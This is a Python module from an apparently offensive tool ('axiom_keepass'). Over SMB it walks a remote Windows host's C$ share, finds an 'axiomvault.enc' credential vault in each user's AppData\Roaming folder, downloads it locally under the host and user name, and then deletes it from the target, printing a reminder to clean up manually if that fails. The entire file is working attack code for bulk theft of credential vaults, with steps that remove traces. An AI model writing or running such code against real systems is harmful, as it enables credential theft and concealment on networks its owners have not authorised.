#!/usr/bin/python3

from axiom_keepass.core.parse_args import AxiomArgParser
from axiom_keepass.client.download import download

def pull(smbClient, thread_index, silent=False):
    users_folder = smbClient.listPath("C$", r"\Users\*")
    print(f"[THREAD {thread_index}][*] Pulling from {smbClient.getRemoteHost()}")
    for f in users_folder:
        if f.is_directory() and f.get_longname() != "." and f.get_longname() != "..":
            if not silent:
                print(f"[THREAD {thread_index}][*] Searching in {f.get_longname()}")

            try:
                target = smbClient.getRemoteHost()
                result = smbClient.listPath("C$", f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc")
                if result is not None:
                    print(f"[THREAD {thread_index}][+] Found a vault! File size is {result[0].get_filesize()} bytes")
                    download(
                        smbClient,
                        thread_index,
                        f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc",
                        f"./{target}_{f.get_longname()}_axiomvault.enc",
                        silent=False
                    )
                    
                    try:
                        smbClient.deleteFile("C$", f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc")
                        print(f"[THREAD {thread_index}][+] Vault deleted from {target}")
                    except:
                        print(f"[THREAD {thread_index}][-] Failed to delete the vault from {target}, remember to do it manually")

            except Exception as e:
                if "STATUS_STOPPED_ON_SYMLINK" in str(e):
                    continue
                elif "STATUS_NO_SUCH_FILE" in str(e):
                    continue
                elif "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                    continue
                else:
                    print(f"[THREAD {thread_index}][-] {str(e)}")

